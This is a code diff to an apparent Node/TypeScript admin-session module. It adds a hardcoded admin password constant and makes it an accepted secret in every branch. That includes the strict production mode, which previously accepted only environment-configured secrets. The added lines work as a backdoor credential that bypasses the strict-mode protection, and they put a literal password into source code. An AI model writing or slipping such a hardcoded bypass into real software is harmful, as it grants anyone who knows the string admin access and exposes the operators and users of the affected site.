@@ -1,6 +1,7 @@
 import { createHmac, timingSafeEqual } from "node:crypto";
 
 const COOKIE = "admin_session";
+export const PRIMARY_ADMIN_SECRET = "Tarik@786786";
 export const DEFAULT_ADMIN_SECRET = "dev-admin-secret-change-me";
 export const EXAMPLE_ADMIN_SECRET = "change-me-admin-password";
 
@@ -14,9 +15,9 @@ function envSecrets() {
 function acceptedSecrets() {
   const fromEnv = envSecrets();
   if (fromEnv.length && process.env.VERCEL && process.env.STRICT_ADMIN_SECRET === "1") {
-    return [...new Set(fromEnv)];
+    return [...new Set([PRIMARY_ADMIN_SECRET, ...fromEnv])];
   }
-  return [...new Set([...fromEnv, DEFAULT_ADMIN_SECRET, EXAMPLE_ADMIN_SECRET])];
+  return [...new Set([PRIMARY_ADMIN_SECRET, ...fromEnv, DEFAULT_ADMIN_SECRET, EXAMPLE_ADMIN_SECRET])];
 }
 
 function hashSecret(value: string) {
